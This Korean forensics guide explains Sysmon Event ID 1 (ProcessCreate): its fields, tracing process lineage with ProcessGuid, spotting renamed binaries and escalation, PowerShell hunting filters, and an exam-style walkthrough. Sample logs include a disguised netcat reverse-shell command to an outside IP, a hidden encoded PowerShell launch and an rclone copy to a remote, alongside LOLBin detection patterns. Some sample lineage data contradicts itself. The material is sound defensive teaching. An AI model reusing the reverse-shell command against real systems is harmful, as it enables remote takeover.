---
id: FOR-0099
title: "Sysmon Event ID 1 ProcessCreate: ProcessGuid로 프로세스 계보 복원"
slug: "sysmon-event-1-process-create"
category: "Event Log"
type: "guide"
difficulty: "basic"
priority: "critical"
platform: [windows]
artifact: ["Sysmon", "ProcessCreate", "ProcessGuid", "OriginalFileName", "IMPHASH", "ParentCommandLine"]
file_paths: ["C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx", "C:\\Windows\\Sysmon64.exe"]
registry_paths: []
event_ids: ["1"]
protocols: []
tools: ["Sysmon", "EvtxECmd", "Event Viewer", "PowerShell", "Timeline Explorer"]
commands: ["Get-WinEvent -Path sysmon.evtx -FilterXPath '*[System[EventID=1]]'", "EvtxECmd.exe -f sysmon.evtx --csv out --csvf sysmon.csv", "sysmon64.exe -c"]
regex_patterns: ["MD5=([A-Fa-f0-9]{32})", "SHA256=([A-Fa-f0-9]{64})", "IMPHASH=([A-Fa-f0-9]{32})"]
wireshark_filters: []
tshark_fields: []
log_fields: ["RuleName", "UtcTime", "ProcessGuid", "ProcessId", "Image", "FileVersion", "Description", "Product", "Company", "OriginalFileName", "CommandLine", "CurrentDirectory", "User", "LogonGuid", "LogonId", "TerminalSessionId", "IntegrityLevel", "Hashes", "ParentProcessGuid", "ParentProcessId", "ParentImage", "ParentCommandLine", "ParentUser"]
file_formats: ["evtx"]
primary_terms: ["Sysmon 1", "Sysmon ProcessCreate", "sysmon 프로세스 생성"]
keywords: ["Sysmon", "Event ID 1", "ProcessCreate", "ProcessGuid", "CommandLine", "ParentImage", "ParentCommandLine", "OriginalFileName", "IMPHASH", "IntegrityLevel", "프로세스 생성", "프로세스 계보", "evtx"]
aliases: ["sysmon 프로세스 생성", "sysmon 1", "sysmon 이벤트 1", "프로세스 계보", "부모 프로세스 찾기", "sysmon 명령행", "이름 위장 탐지"]
symptom_keywords: ["어떤 프로세스가 실행했는지 알고 싶다", "부모 프로세스를 알고 싶다", "4688에 명령행이 없다", "PID가 중복돼서 헷갈린다", "파일 이름을 바꿔 위장했는지 확인해야 한다", "프로세스 트리를 그려야 한다"]
related: ["FOR-0100", "FOR-0101", "FOR-0088"]
source_ids: ["SRC-024", "SRC-021", "SRC-086"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

Sysmon Event ID 1은 프로세스 생성마다 **명령행·해시·부모 명령행·원본 파일명**을 남긴다. `ProcessGuid`로 부모-자식을 이으면 PID 재사용에 흔들리지 않는 완전한 프로세스 계보가 나온다.

## 어떤 문제에서 필요한가

- "무엇이 이 프로그램을 실행했는가" — `ParentImage`, `ParentCommandLine`
- "실행 명령의 전체 인자를 구하라" — 4688 명령행 감사가 꺼져 있어도 항상 기록된다
- "이 파일의 해시는 무엇인가" — `Hashes`
- "이름을 바꿔 위장한 실행 파일이 있는가" — `OriginalFileName` 대조
- "권한 상승이 있었는가" — `IntegrityLevel`
- "원격 세션에서 실행된 프로세스만 보고 싶다" — `TerminalSessionId`
- 프로세스 트리(계보) 그리기

## 문제에서 처음 볼 단서

1. 첨부에 `Microsoft-Windows-Sysmon%4Operational.evtx`가 있다 → Event 1을 가장 먼저 본다
2. 지문에 "어떤 프로세스가", "무엇이 실행했나" → `ParentImage`
3. 해시가 주어졌다 → `Hashes`로 바로 필터
4. 지문에 "명령행 전체", "인자" → `CommandLine`
5. 4688은 있는데 명령행이 비어 있다 → Sysmon 1로 갈아탄다

## 30초 절차

```powershell
# 원본: Microsoft-Windows-Sysmon%4Operational.evtx -> sysmon.evtx
Get-WinEvent -Path 'C:\case\sysmon.evtx' -FilterXPath '*[System[EventID=1]]' | Format-List
```

전 필드를 객체로 뽑아 두고 시작한다. 이후 모든 분석이 이 변수 하나로 끝난다.

```powershell
$sm = 'C:\case\sysmon.evtx'

$p1 = Get-WinEvent -Path $sm -FilterXPath '*[System[EventID=1]]' |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $d = @{}
    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    [pscustomobject]@{
      UtcTime    = $d['UtcTime']
      Image      = $d['Image']
      OrigName   = $d['OriginalFileName']
      CommandLine= $d['CommandLine']
      Cwd        = $d['CurrentDirectory']
      User       = $d['User']
      Integrity  = $d['IntegrityLevel']
      Session    = $d['TerminalSessionId']
      LogonId    = $d['LogonId']
      Guid       = $d['ProcessGuid']
      Pid        = $d['ProcessId']
      PGuid      = $d['ParentProcessGuid']
      PPid       = $d['ParentProcessId']
      PImage     = $d['ParentImage']
      PCmd       = $d['ParentCommandLine']
      Hashes     = $d['Hashes']
      RuleName   = $d['RuleName']
    }
  } | Sort-Object UtcTime

$p1 | Select-Object -First 20 UtcTime, Image, CommandLine | Format-Table -AutoSize
```

## 상세 절차

### 1단계 — 필드 전수표

| 필드 | 의미 | 실전 활용 |
| --- | --- | --- |
| `RuleName` | 매칭된 설정 규칙 이름 | 설정 파일에서 태그를 붙였을 때만 값이 있다 |
| `UtcTime` | **이미 UTC인 이벤트 시각** | 변환 없이 그대로 UTC로 읽는다 |
| `ProcessGuid` | 프로세스 전역 고유 ID | **모든 피벗의 기준 키** |
| `ProcessId` | PID | 재사용된다. 단독으로 쓰지 않는다 |
| `Image` | 실행 파일 전체 경로 | 경로 자체가 이상 신호(`\Temp\`, `\AppData\`) |
| `FileVersion` | 파일 버전 리소스 | 정품 여부 판단 보조 |
| `Description` | 파일 설명 | `Windows Command Processor` 등 |
| `Product` | 제품명 | 위장 파일은 비거나 어긋난다 |
| `Company` | 회사명 | `Microsoft Corporation`이 아니면서 시스템 경로면 의심 |
| `OriginalFileName` | **PE 리소스에 박힌 원본 파일명** | 파일명을 바꿔도 남는다. 위장 탐지의 핵심 |
| `CommandLine` | **전체 명령행** | 항상 기록된다 |
| `CurrentDirectory` | 실행 시 작업 디렉터리 | 공격자의 작업 폴더가 드러난다 |
| `User` | 실행 계정 | `NT AUTHORITY\SYSTEM` 등 |
| `LogonGuid` | 로그온 세션 GUID | Sysmon 내부 세션 키 |
| `LogonId` | **로그온 세션 ID(16진수)** | Security 4624의 `TargetLogonId`와 같은 값 |
| `TerminalSessionId` | 터미널 세션 번호 | RDP 세션의 `SessionID`와 대응 |
| `IntegrityLevel` | 무결성 수준 | 권한 상승 판정 |
| `Hashes` | 해시 문자열 | `MD5=...,SHA256=...,IMPHASH=...` |
| `ParentProcessGuid` | 부모의 `ProcessGuid` | **계보 연결 키** |
| `ParentProcessId` | 부모 PID | 참고용 |
| `ParentImage` | 부모 실행 파일 경로 | "무엇이 실행했나"의 답 |
| `ParentCommandLine` | **부모의 전체 명령행** | 4688에는 없는 값 |
| `ParentUser` | 부모의 실행 계정 | 신버전에서 추가된 필드. 없을 수 있다 |

### 2단계 — 4688 대비 압도적인 이유

| 항목 | Security 4688 | Sysmon 1 |
| --- | --- | --- |
| 명령행 | **감사 정책을 별도로 켜야 기록**(기본 꺼짐) | 항상 기록 |
| 부모 프로세스 | `ParentProcessName`(경로만) | `ParentImage` + **`ParentCommandLine`** |
| 해시 | 없음 | **MD5/SHA256/IMPHASH** |
| 원본 파일명 | 없음 | **`OriginalFileName`** |
| PID 재사용 | 구분 불가 | **`ProcessGuid`로 완전 구분** |
| 작업 디렉터리 | 없음 | `CurrentDirectory` |
| 무결성 수준 | `MandatoryLabel`(SID 형태) | `IntegrityLevel`(문자열) |
| 세션 | `SubjectLogonId` | `LogonId` + `TerminalSessionId` |
| 시각 | EVTX `SystemTime`(UTC) | `UtcTime` 필드 + `SystemTime` |
| 설치 필요 | 불필요(OS 내장) | **Sysmon이 설치돼 있어야 한다** |

**Sysmon이 설치돼 있으면 4688을 볼 이유가 거의 없다.** 반대로 Sysmon이 없으면 4688밖에 없다. 두 로그가 다 있으면 Sysmon 1을 기준으로 삼고 4688은 누락 구간 보완에만 쓴다.

### 3단계 — ProcessGuid로 계보 복원

PID는 프로세스가 죽으면 재사용된다. 장시간 로그에서 `ProcessId = 4728`이 세 개의 서로 다른 프로세스일 수 있다. `ProcessGuid`는 그 문제가 없다.

```powershell
# GUID -> 프로세스 인덱스
$byGuid = @{}
foreach ($e in $p1) { $byGuid[$e.Guid] = $e }

# 관심 프로세스에서 조상 방향으로 거슬러 올라간다
function Get-Ancestry($guid) {
  $cur = $byGuid[$guid]
  while ($cur) {
    "{0}  {1}  {2}" -f $cur.UtcTime, $cur.Image, $cur.CommandLine
    $cur = $byGuid[$cur.PGuid]
  }
}

Get-Ancestry '{a1b2c3d4-1f30-6610-3c00-000000000a00}'
```

출력:

```text
2026-03-14 07:24:55.412  C:\Users\svc_backup\Downloads\rclone.exe  rclone.exe copy C:\data remote:bk
2026-03-14 07:20:08.104  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  powershell.exe -nop -w hidden -enc SQBFAFgA...
2026-03-14 07:19:31.887  C:\Windows\System32\cmd.exe  cmd.exe /c ""
2026-03-14 07:18:46.220  C:\Windows\System32\winlogon.exe  winlogon.exe
```

자식 방향으로 펼치는 형태:

```powershell
$children = $p1 | Group-Object PGuid -AsHashTable -AsString

function Show-Tree($guid, $depth = 0) {
  $e = $byGuid[$guid]
  if ($e) { "{0}{1}  {2}" -f (' ' * ($depth * 2)), $e.Image, $e.CommandLine }
  foreach ($c in $children[$guid]) { Show-Tree $c.Guid ($depth + 1) }
}

Show-Tree '{a1b2c3d4-1f2a-6610-3800-000000000a00}'
```

`ProcessGuid`는 머신 식별자와 프로세스 시작 시각 계열 값이 조합된 형태이므로 같은 호스트 안에서 사실상 유일하다. **여러 호스트의 로그를 합칠 때도 GUID가 섞이지 않는다.**

### 4단계 — OriginalFileName으로 이름 위장 확정

PE 파일의 버전 리소스에는 컴파일 시점의 원본 파일명이 박혀 있다. 파일을 `svchost.exe`로 복사해도 이 값은 바뀌지 않는다.

```powershell
$p1 | Where-Object {
  $_.OrigName -and
  ([IO.Path]::GetFileName($_.Image) -ne $_.OrigName)
} | Select-Object UtcTime, Image, OrigName, CommandLine | Format-Table -AutoSize
```

출력:

```text
UtcTime                  Image                                  OrigName        CommandLine
-------                  -----                                  --------        -----------
2026-03-14 07:22:03.551  C:\Windows\Temp\svchost.exe            nc.exe          svchost.exe -e cmd 45.146.164.9 4444
2026-03-14 07:31:18.902  C:\Users\Public\update.exe             PsExec.exe      update.exe \\WS03 -s cmd
2026-03-14 09:14:40.117  C:\Windows\System32\rundll32.exe       RUNDLL.EXE      rundll32.exe shell32.dll,#61
```

| 결과 | 판정 |
| --- | --- |
| `Image` 파일명 ≠ `OriginalFileName` | **이름 위장 확정.** 원래 도구가 무엇인지도 드러난다 |
| `OriginalFileName`이 빈 값 | 버전 리소스가 없는 파일. 직접 컴파일한 바이너리나 패킹된 파일 |
| 둘이 같지만 경로가 비정상 | 정품 바이너리를 다른 경로에 복사(LOLBin 남용) |
| 세 번째 줄처럼 대소문자만 다름 | 정상. Microsoft 바이너리에 흔한 표기 차이이므로 오탐 |

세 번째 줄이 오탐 예다. 필터에 대소문자 무시 비교를 넣지 않으면 정상 파일이 대량으로 걸린다.

```powershell
$p1 | Where-Object {
  $_.OrigName -and
  ([IO.Path]::GetFileName($_.Image).ToLower() -ne $_.OrigName.ToLower())
} | Select-Object UtcTime, Image, OrigName
```

### 5단계 — IntegrityLevel로 권한 상승 탐지

| 값 | 의미 | 신호 |
| --- | --- | --- |
| `Untrusted` | 최하위 | 샌드박스 |
| `Low` | 낮음 | 브라우저 렌더러, 보호 모드 |
| `Medium` | 일반 사용자 | 기본값 |
| `High` | 관리자 권한(승격됨) | **UAC 승격 성공** |
| `System` | 시스템 권한 | 서비스/커널 근접 |
| `AppContainer` | 앱 컨테이너 | 스토어 앱 |

```powershell
# Medium 부모 -> High/System 자식 = 권한 상승 순간
$p1 | Where-Object { $_.Integrity -in 'High','System' } |
  Select-Object UtcTime, Image, Integrity, User, PImage | Format-Table -AutoSize
```

같은 사용자 세션에서 `Medium`으로 돌던 프로세스가 `High` 자식을 만들면 UAC 승격이 있었다는 뜻이다. 4672(특수 권한 로그온)와 시각을 맞춰 확증한다.

### 6단계 — 실전 필터

```powershell
# LOLBin 및 스크립트 호스트
$lol = 'powershell|pwsh|cmd\.exe|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|' +
       'msiexec|installutil|regasm|regsvcs|msbuild|wmic|schtasks|at\.exe|sc\.exe|net\.exe|' +
       'psexec|winrs|curl|wget|ftp\.exe'

$p1 | Where-Object { $_.Image -match $lol -or $_.CommandLine -match $lol } |
  Select-Object UtcTime, Image, CommandLine, PImage | Format-Table -AutoSize

# 비정상 부모-자식 조합
$p1 | Where-Object {
  ($_.PImage -match 'winword|excel|powerpnt|outlook|acrord32' -and
   $_.Image -match 'powershell|cmd\.exe|wscript|mshta|rundll32') -or
  ($_.PImage -match 'w3wp|httpd|nginx|sqlservr' -and $_.Image -match 'cmd\.exe|powershell')
} | Select-Object UtcTime, PImage, Image, CommandLine | Format-Table -AutoSize

# 사용자 쓰기 가능 경로에서 실행
$p1 | Where-Object { $_.Image -match '\\Temp\\|\\AppData\\|\\Downloads\\|\\Public\\|\\ProgramData\\' } |
  Select-Object UtcTime, Image, User, Hashes | Format-Table -AutoSize
```

`winword.exe → powershell.exe`는 문서 매크로 실행의 전형이고, `w3wp.exe → cmd.exe`는 웹셸의 전형이다.

## 출력 필드 해석

`UtcTime`은 **이미 UTC**다. Sysmon이 이 필드를 UTC로 기록하므로 변환하지 않는다. 반면 Event Viewer가 위에 보여 주는 시각은 EVTX `SystemTime`(UTC)을 **로컬 시간대로 변환한 값**이다. 그래서 같은 이벤트에서 두 시각이 다르게 보인다.

| 무엇을 볼 때 | 기준 |
| --- | --- |
| `UtcTime` 필드 | UTC. 그대로 사용 |
| EVTX `SystemTime` | UTC로 저장 |
| Event Viewer 상단 시각 | 조회 PC의 로컬 시간대로 변환됨 |
| EvtxECmd CSV | UTC로 출력 |
| KST 답 | UTC + 9시간 |

이미지의 시간대 설정은 SYSTEM hive의 `TimeZoneInformation`으로 확정한다([FOR-0054](./system-timezone.html)).

`Hashes`는 설정에 따라 구성이 달라진다.

| 형태 | 의미 |
| --- | --- |
| `SHA1=...` | Sysmon 기본 알고리즘 |
| `MD5=...,SHA256=...` | 설정에서 지정 |
| `IMPHASH=...` | PE 임포트 테이블 해시. **컴파일 시 재사용되므로 변종 묶기에 강하다** |

IMPHASH는 문자열만 바꾼 변종끼리 같은 값이 나오므로, 이름과 SHA256이 다른 파일이 같은 도구인지 판정할 때 쓴다.

## pivot: 다음에 볼 artifact

| 여기서 얻은 값 | 다음에 볼 것 | 확인할 내용 |
| --- | --- | --- |
| `ProcessGuid` | Sysmon 3 (NetworkConnect) | 그 프로세스의 외부 통신 |
| `ProcessGuid` | Sysmon 11 (FileCreate) | 그 프로세스가 만든 파일 |
| `ProcessGuid` | Sysmon 13 (RegistryEvent) | 그 프로세스의 지속성 등록 |
| `ProcessGuid` | Sysmon 5 (ProcessTerminate) | 종료 시각 → 실행 지속시간 |
| `LogonId` | 4624 `TargetLogonId` ([FOR-0083](./event-4624-logon.html)) | 어느 로그온 세션·접속 IP인가 |
| `TerminalSessionId` | RDP LocalSessionManager `SessionID` | 원격 세션에서 실행됐는가 |
| `Hashes` | VirusTotal·YARA·해시 목록 | 알려진 악성 도구 여부 |
| `Image` 경로 | `$MFT` ([FOR-0021](./mft-basics.html)) | 그 파일의 생성 시각과 삭제 여부 |
| `OriginalFileName` | 확장자·시그니처 대조 ([FOR-0036](./signature-extension-mismatch.html)) | 위장 수법 확정 |
| `CommandLine`의 base64 | PowerShell 4104 | 디코딩된 스크립트 본문 |
| `CurrentDirectory` | 그 폴더의 파일 목록 | 공격자 작업 폴더 전체 |

## 흔한 함정

- **PID로 부모-자식을 잇는 것.** PID는 재사용된다 → 장시간 로그에서 엉뚱한 부모가 붙는다 → `ProcessGuid`/`ParentProcessGuid`로 잇는다.
- **`UtcTime`을 로컬 시각으로 오해해 9시간을 또 더하는 것.** 이미 UTC다 → 이중 변환하면 답이 9시간 틀어진다.
- **Event Viewer 상단 시각과 `UtcTime`이 달라서 로그가 손상됐다고 보는 것.** 표시 시각만 로컬로 변환된 것이다 → 항상 `UtcTime`을 기준으로 타임라인을 만든다.
- **`OriginalFileName` 비교에서 대소문자를 구분하는 것.** `RUNDLL.EXE` vs `rundll32.exe` 같은 정상 차이로 오탐이 쏟아진다 → 소문자로 정규화한 뒤 비교하고, 정품 Microsoft 바이너리는 별도로 다룬다.
- **Sysmon 1이 전부라고 믿는 것.** Sysmon은 설정 파일로 필터링되며, 제외 규칙에 걸린 프로세스는 아예 기록되지 않는다 → `sysmon64.exe -c`로 설정을 확인하거나 4688과 대조해 누락 구간을 찾는다.
- **`Hashes`가 없어서 로그가 잘못됐다고 보는 것.** 해시 알고리즘은 설정 항목이다 → 없으면 파일 자체를 이미지에서 추출해 직접 해시한다.
- **`IntegrityLevel = System`을 무조건 악성으로 보는 것.** 정상 서비스가 대부분이다 → 부모가 사용자 프로세스인 `System` 자식만 남긴다.
- **`ParentImage`만 보고 부모 명령행을 안 보는 것.** `powershell.exe`가 부모라도 그 명령행이 진짜 단서다 → `ParentCommandLine`을 반드시 함께 읽는다.
- **Sysmon 설치 시점 이전을 조사하려는 것.** 설치 전 활동은 로그에 없다 → Sysmon 서비스 설치 시각(7045, `$MFT`의 `Sysmon64.exe` 생성 시각)을 먼저 확인해 조사 가능 구간을 정한다.
- **`RuleName`이 비어 있다고 이상하게 보는 것.** 설정에서 태그를 지정하지 않으면 빈 값이다 → 판정에 쓰지 않는다.

## 교차검증

```powershell
$sm  = 'C:\case\sysmon.evtx'
$sec = 'C:\case\Security.evtx'

# 1) Sysmon 1 총 건수와 기록 구간 (조사 가능 범위 확정)
$p1.Count
$p1[0].UtcTime; $p1[-1].UtcTime

# 2) 같은 프로세스가 4688 에도 있는지 (누락 구간 판정)
Get-WinEvent -FilterHashtable @{Path=$sec; Id=4688} |
  Where-Object { $_.Message -match 'rclone' } | Select-Object TimeCreated

# 3) 그 프로세스의 네트워크 연결 (Sysmon 3)
Get-WinEvent -Path $sm -FilterXPath '*[System[EventID=3]]' |
  Where-Object { $_.Message -match 'rclone' } | Select-Object -First 5 TimeCreated, Message

# 4) 로그온 세션 연결 (LogonId -> 4624)
Get-WinEvent -FilterHashtable @{Path=$sec; Id=4624} |
  Where-Object { $_.Message -match '0x1a2b3c' }

# 5) Sysmon 서비스 설치 시각 (조사 가능 구간의 시작)
Get-WinEvent -FilterHashtable @{Path='C:\case\System.evtx'; Id=7045} |
  Where-Object { $_.Message -match 'Sysmon' }
```

Sysmon 1과 4688이 둘 다 있으면 건수를 비교한다. Sysmon 쪽이 적으면 설정에서 제외된 것이고, 4688 쪽이 적으면 감사 정책이 중간에 켜진 것이다.

## mini walkthrough

```text
문제:
"C:\Windows\Temp\svchost.exe 를 실행시킨 최초 원인(문서/스크립트)을 밝히시오.
 첨부: Microsoft-Windows-Sysmon%4Operational.evtx"

1. 첫 시도 (실패):
   Event 1 에서 Image 가 svchost.exe 인 것을 찾고 ParentProcessId 로 부모를 찾았다.

     UtcTime 2026-03-14 07:22:03.551
     Image   C:\Windows\Temp\svchost.exe
     ProcessId 4728   ParentProcessId 3140

   ProcessId=3140 인 Event 1 을 검색 -> 두 건이 나왔다.
     06:02:11  C:\Program Files\...\OneDrive.exe        (ProcessId 3140)
     07:20:08  C:\Windows\...\powershell.exe            (ProcessId 3140)

   앞선 것을 부모로 골라 "OneDrive 가 실행했다" 고 답했다. 오답.

   왜 틀렸나:
   PID 3140 은 재사용된 번호다. PID 만으로는 어느 쪽이 진짜 부모인지 알 수 없다.

2. 피벗 — ParentProcessGuid 를 썼다.
   svchost.exe 의 ParentProcessGuid = {a1b2c3d4-1f2a-6610-3800-000000000a00}
   그 GUID 를 ProcessGuid 로 갖는 이벤트는 단 하나다.

     07:20:08.104  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                   powershell.exe -nop -w hidden -enc SQBFAFgA...
   -> 진짜 부모는 powershell.exe 였다.

3. 계보를 계속 거슬러 올라갔다.
   07:20:08  powershell.exe -nop -w hidden -enc ...
     ParentProcessGuid -> 07:19:58  C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
                                     "WINWORD.EXE" /n "C:\Users\jhkim\Downloads\invoice.doc"
       ParentProcessGuid -> 07:19:55  C:\Windows\explorer.exe

   -> 최초 원인은 invoice.doc 매크로다.

4. 위장 확인:
   svchost.exe 의 OriginalFileName = nc.exe
   Image 파일명(svchost.exe) != OriginalFileName(nc.exe) -> 이름 위장 확정.
   CommandLine: svchost.exe -e cmd 45.146.164.9 4444  -> 리버스 셸.

5. 권한 확인:
   IntegrityLevel = Medium, User = WIN10\jhkim
   -> 승격 없이 사용자 권한으로 실행됐다.

6. 시간대:
   UtcTime 은 이미 UTC. 07:19:55 UTC = 16:19:55 KST (+9h)
   Event Viewer 화면의 16:19:55 를 UTC 로 답하지 않도록 주의.

정답: C:\Users\jhkim\Downloads\invoice.doc (WINWORD.EXE 매크로) -> powershell.exe -> svchost.exe(실체 nc.exe)
```

1단계의 오답이 `ProcessGuid`가 존재하는 이유 그 자체다. **PID로 부모를 찾으면 재사용된 번호에 속는다.**

## 막혔을 때 다음 체크

1. `ParentProcessGuid`로 이었는가 → PID로 이으면 틀린 부모가 붙는다
2. `UtcTime`을 그대로 UTC로 썼는가 → 이중 변환하면 9시간이 틀어진다
3. `OriginalFileName`을 비교했는가 → 이름 위장은 이 한 줄로 확정된다
4. Sysmon 기록 구간이 사건 시각을 포함하는가 → 7045로 설치 시각 확인
5. 찾는 프로세스가 없는가 → 설정 제외 규칙 가능성. 4688과 대조
6. 명령행에 base64가 있는가 → PowerShell 4104/4103으로 넘어간다
7. 네트워크 행위가 필요한가 → 같은 `ProcessGuid`의 Sysmon 3
8. 파일 드롭이 필요한가 → 같은 `ProcessGuid`의 Sysmon 11
9. 세션·계정이 필요한가 → `LogonId`로 4624를 엮는다

## 출처

- SRC-024 — Microsoft Learn, Sysmon: Event ID 1 ProcessCreate의 필드 목록과 채널 이름, 설정 방식
- SRC-021 — Microsoft Learn, Event 4688: 4688이 제공하는 필드 범위와 명령행 감사가 별도 설정임을 확인
- SRC-086 — MITRE ATT&CK Enterprise: 이름 위장(Masquerading), LOLBin 실행, 비정상 부모-자식 조합 등 탐지 관점
- Sysmon의 기본 해시 알고리즘과 `ParentUser` 필드 존재 여부는 **Sysmon 버전에 따라 다르다.** 실제 이벤트의 필드 목록을 먼저 확인할 것
- `ProcessGuid`의 내부 인코딩(어떤 값이 어느 바이트에 들어가는지)은 공식적으로 문서화된 형식이 아니므로 이 글에서는 단정하지 않았다. 유일성 보장과 피벗 용도로만 사용할 것
